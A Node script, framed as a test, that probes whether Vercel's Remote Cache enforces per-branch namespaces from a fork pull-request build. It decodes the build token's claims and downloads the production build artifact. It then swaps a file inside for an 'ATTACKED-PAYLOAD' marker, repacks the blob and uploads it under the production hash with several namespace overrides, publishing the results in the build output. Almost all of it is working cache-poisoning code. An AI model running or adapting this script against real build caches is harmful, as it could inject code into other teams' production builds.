// Namespace write test, run inside a fork-PR (preview) build.
//
// Question: Vercel's remote-caching docs say a fork/pull-request build "only
// uploads to their own branch namespace" and that "each build can upload to one
// namespace at most". Does the Remote Cache API actually enforce that, or does
// it honour a caller-supplied namespace?
//
// Prints only statuses, opaque ids and hashes - no token, no secret values.
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import fs from 'node:fs';

const TOKEN = process.env.VERCEL_ARTIFACTS_TOKEN || '';
// region host is discovered at runtime (the cell's egress allowlist is per-host)
const CANDIDATE_HOSTS = ['https://api-iad1.vercel.com', 'https://api-sfo1.vercel.com', 'https://api-fra1.vercel.com'];
let HOST = CANDIDATE_HOSTS[0];
// @lab/vault#build hash taken from the production build's own dry-run output.
const PROD_HASH = process.env.PROD_HASH || 'ef9cee4251207927';
const MARK = 'lab-ns-' + Date.now().toString(16);
const lines = [];
function log(s) { lines.push(String(s)); }

function sh(cmd) {
  const r = spawnSync('/bin/sh', ['-c', cmd], { encoding: 'utf8', timeout: 60000 });
  return { code: r.status, out: (r.stdout || '').trim(), err: (r.stderr || '').trim() };
}

async function req(path, opts = {}) {
  try {
    const r = await fetch(HOST + path, {
      method: opts.method || 'GET',
      headers: { Authorization: 'Bearer ' + TOKEN, ...(opts.headers || {}) },
      body: opts.body,
    });
    const buf = new Uint8Array(await r.arrayBuffer());
    return { status: r.status, buf, text: new TextDecoder().decode(buf).slice(0, 240) };
  } catch (e) {
    return { status: 0, buf: new Uint8Array(0), text: 'ERR ' + (e.message || '') };
  }
}

function hex(b) { return Array.from(b.slice(0, 8)).map(x => x.toString(16).padStart(2, '0')).join(''); }
function digest(b) { return createHash('sha256').update(b).digest('hex').slice(0, 16); }

// read() with an optional namespace query - tells us whether reads honour it
async function readHash(hash, ns) {
  const q = '/v8/artifacts/' + hash + '?teamId=' + team + (ns ? '&namespace=' + ns : '');
  const r = await req(q);
  return { ns: ns || 'default', status: r.status, size: r.buf.length, sha: r.buf.length ? digest(r.buf) : '-' };
}

let team = '';

(async () => {
  log('== namespace write probe ==');
  log('env=' + (process.env.VERCEL_ENV || '?') + ' branch=' + (process.env.VERCEL_BRANCH_URL || '?'));

  // which region host can this cell actually reach? any HTTP status = reachable
  for (const h of CANDIDATE_HOSTS) {
    let s = 0;
    try {
      const rr = await fetch(h + '/v8/artifacts/status', { headers: { Authorization: 'Bearer ' + TOKEN } });
      s = rr.status;
    } catch (e) { s = 0; }
    log('reach ' + h + ' -> ' + s);
    if (s >= 200 && s < 500) { HOST = h; break; }
  }
  log('using host ' + HOST);

  let claims = {};
  try { claims = JSON.parse(Buffer.from(TOKEN.split('.')[1], 'base64').toString('utf8')); } catch (e) {}
  const d = claims.data || {};
  const pol = (d.secureCachePolicy && d.secureCachePolicy.policy) || {};
  team = pol.ownerId || d.ownerId || '';
  log('caps=' + JSON.stringify(d.capabilities || []));
  log('readNs=' + JSON.stringify(pol.readNamespaces || []) + ' writeNs=' + JSON.stringify(pol.writeNamespace));
  log('repo=' + (pol.repository && pol.repository.id) + ' source=' + (pol.sourceRepository && pol.sourceRepository.id));
  log('team=' + (team ? team.slice(0, 6) + '…' : '?') + ' prodHash=' + PROD_HASH);

  // 0. does the API advertise a read-only flag for this token?
  const st = await req('/v8/artifacts/status?teamId=' + team);
  log('GET /v8/artifacts/status -> ' + st.status + ' ' + st.text);

  // 1. control: upload to a brand new key, see where it lands
  const up1 = await req('/v8/artifacts/' + MARK + '?teamId=' + team, {
    method: 'PUT', headers: { 'Content-Type': 'application/octet-stream' },
    body: Buffer.from('CONTROL-BYTES-' + MARK),
  });
  log('PUT new key ' + MARK + ' -> ' + up1.status + ' ' + up1.text);
  const back = await req('/v8/artifacts/' + MARK + '?teamId=' + team);
  log('GET control key -> ' + back.status + ' body=' + new TextDecoder().decode(back.buf).slice(0, 40));

  // 2. baseline reads of the production artifact, namespace-scoped
  const base = [];
  for (const ns of [null, 'shared', 'branch', 'historical']) {
    base.push(await readHash(PROD_HASH, ns));
  }
  log('baseline GETs of prod hash: ' + JSON.stringify(base));

  const g0 = base[0];
  let newBin = null;
  if (g0.status === 200 && g0.size) {
    const raw = await req('/v8/artifacts/' + PROD_HASH + '?teamId=' + team);
    fs.writeFileSync('/tmp/orig.bin', raw.buf);
    const dz = sh('zstd -q -d -o /tmp/orig.tar /tmp/orig.bin 2>&1; tar tf /tmp/orig.tar 2>&1 | head -20');
    log('orig blob: zstd+tar listing -> exit ' + dz.code + '\n' + dz.out + dz.err);
    const ex = sh('rm -rf /tmp/x; mkdir -p /tmp/x; tar xf /tmp/orig.tar -C /tmp/x 2>&1; find /tmp/x -type f | head -20');
    log('extract -> exit ' + ex.code + '\n' + ex.out + ex.err);
    const rz = sh("f=$(find /tmp/x -type f | head -1); echo 'ATTACKED-PAYLOAD-9k2f' > /tmp/payload.txt; " +
      "cp /tmp/payload.txt \"$f\" 2>/dev/null; " +
      "cd /tmp/x && tar cf /tmp/new.tar $(tar tf /tmp/orig.tar | tr '\\n' ' ') 2>&1; " +
      "zstd -q -f -o /tmp/new.bin /tmp/new.tar 2>&1; wc -c /tmp/new.bin");
    log('repack -> exit ' + rz.code + '\n' + rz.out + rz.err);
    if (fs.existsSync('/tmp/new.bin')) newBin = fs.readFileSync('/tmp/new.bin');
  } else {
    log('no production blob to modify (status ' + g0.status + '); aborting write-back');
  }

  const writes = [];
  if (newBin) {
    log('attacked blob sha=' + digest(newBin) + ' size=' + newBin.length + ' (original sha=' + g0.sha + ')');
    const variants = [
      ['plain', '/v8/artifacts/' + PROD_HASH + '?teamId=' + team],
      ['?namespace=shared', '/v8/artifacts/' + PROD_HASH + '?teamId=' + team + '&namespace=shared'],
      ['?namespace=production', '/v8/artifacts/' + PROD_HASH + '?teamId=' + team + '&namespace=production'],
      ['?cacheNamespace=shared', '/v8/artifacts/' + PROD_HASH + '?teamId=' + team + '&cacheNamespace=shared'],
    ];
    for (const [label, path] of variants) {
      const w = await req(path, { method: 'PUT', headers: { 'Content-Type': 'application/octet-stream' }, body: newBin });
      log('PUT prod hash [' + label + '] -> ' + w.status + ' ' + w.text);
      writes.push(label + ':' + w.status);
    }
    // where did it actually land? re-read every namespace separately
    const after = [];
    for (const ns of [null, 'shared', 'branch', 'historical']) {
      after.push(await readHash(PROD_HASH, ns));
    }
    log('after writes: ' + JSON.stringify(after));
    log('writes=' + writes.join(' '));
  }

  fs.mkdirSync('public', { recursive: true });
  fs.writeFileSync('public/probe.txt', lines.join('\n') + '\n');
  console.log(lines.join('\n'));
})().catch(e => {
  fs.mkdirSync('public', { recursive: true });
  fs.writeFileSync('public/probe.txt', lines.join('\n') + '\nfatal: ' + (e && e.message));
});
